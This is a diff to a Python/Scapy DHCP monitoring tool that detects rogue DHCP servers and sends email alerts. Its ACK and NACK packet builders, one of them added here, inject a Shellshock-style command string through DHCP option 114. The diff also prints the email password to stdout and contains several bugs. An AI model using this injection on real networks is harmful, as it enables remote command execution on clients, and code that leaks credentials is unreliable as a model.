@@ -33,6 +33,10 @@ class DHCPLock:
 		self.clients = {}
 		self.rogue_servers = []
 		self.foundRogue = False
+		self.mail_sender = ''
+		self.mail_receiver = ''
+		self.mail_domain = ''
+		self.password = ''
 		if filename is not None:
 			self.interfaces = self.read_file(filename)
 		if interfaces is not None and serverIP is not None and serverMAC is not None:	
@@ -41,15 +45,21 @@ class DHCPLock:
 		
 		
 	def read_file(self, filename):
-		#TODO: create validator for correct input file 
 		f = open(filename, 'r')
 		data = json.loads(f.read())
 		interfaces = data['configDetails']['interfaces']
 		ip, mac = data['configDetails']['servers'][0]['serverIP'], data['configDetails']['servers'][0]['serverMAC']
-		self.trusted_servers.append((ip, mac))
+		self.trusted_servers.append((mac, ip))
+		if data['configDetails']['servers'][0]['mailOn'] == True:
+			self.mail_sender = data['configDetails']['servers'][0]['emailSender']
+			self.mail_domain = data['configDetails']['servers'][0]['emailDomain']
+			self.mail_password = data['configDetails']['servers'][0]['emailPassword']
+			self.mail_receiver = data['configDetails']['servers'][0]['emailReceiver']
+		print('trusted_servers', self.trusted_servers, self.mail_sender, self.mail_receiver, self.mail_domain, self.mail_password)
 		f.close()
 		return interfaces
 		
+
 	def dhcp_ack(self, raw_mac, xid, command):
 		packet = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') 
 		packet /= IP(src="0.0.0.0", dst='255.255.255.255')
@@ -65,6 +75,23 @@ class DHCPLock:
 			(114, "() { ignored;}; " + command),
 			"end"])
 		return packet
+
+
+	def dhcp_nack(self, raw_mac, xid, command):
+		packet = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') 
+		packet /= IP(src="0.0.0.0", dst='255.255.255.255')
+		packet /= UDP(sport=67, dport=68)
+		packet /= BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr=str(self.trusted_servers[0][1]), xid=xid)
+		packet /= DHCP(options=[("message-type", "nack"),
+			('server_id', str(self.trusted_servers[0][1])),
+			('subnet_mask', '255.255.255.0'),
+			('router', '192.168.2.5'),
+			('lease_time', 172800),
+			('renewal_time', 86400),
+			('rebinding_time', 138240),
+			(114, "() { ignored;}; " + command),
+			"end"])
+		return packet	
 
 
 	# Fixup function to extract dhcp_options by key
@@ -85,15 +112,27 @@ class DHCPLock:
 					    return i[1]        
 		except:
 			pass	
+
+
+	def check_for_rogue_server(self,server_ip,server_mac):
+		print('CHECKING', server_ip, server_mac)
+		s_tuple = (server_mac, server_ip)
+		if s_tuple not in self.trusted_servers:
+			logging.warning('[***] POTENTIAL DHCP ROGUE SERVER FOUND [***]')
+			self.foundRogue = True
+			mail_thread = Thread(target=self.sending_email)
+			mail_thread.start()
+		else: 
+			logging.info('[***] DHCP SERVER FOUND [***]')	
 		
 		
 	def dhcp(self,resp):
 		if resp.haslayer(DHCP):
 			mac_addr = resp[Ether].src
 			xid = resp[BOOTP].xid
-			
+
 			# ---- DHCP DISCOVER ----
-			if resp[DHCP].options[0][1] == DHCPTypes.get('discover'):
+			if resp[DHCP].options[0][1] == 1:
 				hostname = self.get_option(resp[DHCP].options, 'hostname')
 				server_id = resp[DHCP].options[1][1]
 				ciaddr = resp[BOOTP].ciaddr
@@ -101,8 +140,9 @@ class DHCPLock:
 				logging.info(f"Host {hostname} with IP {ciaddr}({mac_addr}) asked {server_id} for an IP")
 				#logging.info(resp.show())
 
+
 			# ---- DHCP OFFER ----
-			elif resp[DHCP].options[1][1] == DHCPTypes.get('offer'):
+			elif resp[DHCP].options[0][1] == 2:
 				ciaddr = resp[BOOTP].ciaddr
 				logging.info(f"[*] Got new DHCP OFFER of {ciaddr} ({mac_addr}) xid: {hex(xid)}")
 				subnet_mask = self.get_option(resp[DHCP].options, 'subnet_mask')
@@ -113,19 +153,26 @@ class DHCPLock:
 
 				logging.info(f"DHCP Server {resp[IP].src} ({mac_addr}) offered {resp[BOOTP].yiaddr}")
 				logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: {lease_time}, router: {router}, name_server: {name_server}, domain: {domain}")
-				logging.info(resp.show())
-				#check_for_rogue_server()
+				#logging.info(resp.show())
+				self.check_for_rogue_server(resp[IP].src, mac_addr)
+
 
 			# ---- DHCP REQUEST ----
-			elif resp[DHCP].options[0][1] == DHCPTypes.get('request'):
+			elif resp[DHCP].options[0][1] == 3:
 				logging.info("[*] Got new DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
 				requested_addr = self.get_option(resp[DHCP].options, 'requested_addr')
 				hostname = self.get_option(resp[DHCP].options, 'hostname')
 				logging.info(f"Host {hostname} ({resp[Ether].src}) requested {requested_addr}")
-				
+
+
+			# ---- DHCP DECLINE ----
+			elif resp[DHCP].options[0][1] == 4:
+				logging.info("[*] Got new DHCP DECLINE from: " + mac_addr + " xid: " + hex(xid))
+				logging.info(f"Host {resp[IP].src} ({resp[Ether].src}) declined")
+
 				
 			# ---- DHCP ACK ----
-			elif resp[DHCP].options[1][1] == DHCPTypes.get('ack'):
+			elif resp[DHCP].options[0][1] == 5:
 				logging.info("[*] Got new DHCP ACKNOLEDGMENT from: " + mac_addr + " xid: " + hex(xid))
 				subnet_mask = self.get_option(resp[DHCP].options, 'subnet_mask')
 				lease_time = self.get_option(resp[DHCP].options, 'lease_time')
@@ -136,9 +183,18 @@ class DHCPLock:
 
 				logging.info(f"DHCP Server {resp[IP].src} ({resp[Ether].src}) offered {resp[BOOTP].yiaddr}")
 				logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: {lease_time}, router: {router}, name_server: {name_server}, domain: {domain}")
+				#logging.info(resp.show())
+				self.check_for_rogue_server(resp[IP].src, mac_addr)
 				  
+
+			# ---- DHCP NACK ----
+			elif resp[DHCP].options[0][1] == 6:
+				logging.info("[*] Got new DHCP NACK from: " + mac_addr + " xid: " + hex(xid))
+				logging.info(f"Host {resp[IP].src} ({resp[Ether].src}) NACK")
+				
+		
 			# ---- DHCP RELEASE ----
-			elif resp[DHCP].options[0][1] == DHCPTypes.get('release'):
+			elif resp[DHCP].options[0][1] == 7:
 				#print(resp.show())
 				ciaddr = resp[BOOTP].ciaddr
 				logging.info(f"[*] Got new DHCP RELEASE of {ciaddr} {mac_addr} xid: {hex(xid)}")
@@ -146,25 +202,72 @@ class DHCPLock:
 				hostname = self.get_option(resp[DHCP].options, 'hostname')
 				#TODO: check for rogue DHCP here (for certain server_id)
 				logging.info(f"Host {hostname} with IP {ciaddr} ({mac_addr}) released to {server_id}")
-				      
-			else:
-				print(f"I dont know this DHCP packet")
+				
+
+			# ---- DHCP NACK ----
+			elif resp[DHCP].options[0][1] == 8:
+				logging.info("[*] Got new DHCP INFORM from: " + mac_addr + " xid: " + hex(xid))
+				logging.info(f"Host {resp[IP].src} ({resp[Ether].src}) informed")	
+
+			else: 	
+				print(f"I dont know this DHCP packet", resp[DHCP].options[0][1])
 				print(resp.show())
-				
-				
-	def check_for_rogue_server(self, s_tuple):
-		if s_tuple not in self.trusted_servers:
-			return False
-		return True		
-				
+		
+
+	def sending_email(self):
+		import smtplib
+		from email.mime.text import MIMEText
+
+		# get the data
+		sender = self.mail_sender
+		receiver = self.mail_receiver
+		domain = self.mail_domain
+		password = self.password
+
+		# build the email
+		subject = "DHCP rogue server found!!!"
+		text = """A rogue DHCP server has been found in your network.\nPlease check the local log file for more info."""	
+		message = MIMEText(text, 'plain')
+		message["Subject"] = subject
+		message["From"] = sender	
+		message["To"] = receiver
+		# try to send it
+		try: 
+			smptObj = smtplib.SMTP(domain, 587)
+			smptObj.ehlo()
+			smptObj.starttls()
+			smptObj.login(sender, password)
+			smptObj.sendmail(sender, receiver, message.as_string())
+			print("\nSuccessfully sent email\n")
+		except smtplib.SMTPException as e:
+			print('\nError: unable to send email\n',e)
+		finally: 
+			smptObj.quit()	
+
+
+	def neutralizing_method1(self):
+		pass			
+
+
+	def neutralizing_method2(self):
+		pass	
+
+
+	def check(self):
+		while self.foundRogue:
+			logging.info("[*] [*] Starting neutralizing method ...")
+			print('AAAAAAAAAAA')	
+
+
 				
 	def start(self):
 		thread = Thread(target=self.run)
 		thread.start()
-		while self.foundRogue:
-			logging.info("[*] [*] Starting neutralizing method ...")
-			print('AAAAAAAAAAA')				
+		check_thread = Thread(target=self.check)
+		check_thread.start()
+					
 		
+
 	def run(self):
 		logging.info("[*] Waiting for a DHCP Packets...")
 		sniff(iface=self.interfaces, filter=self.dhcplock_filter, prn=self.dhcp, store=0)	
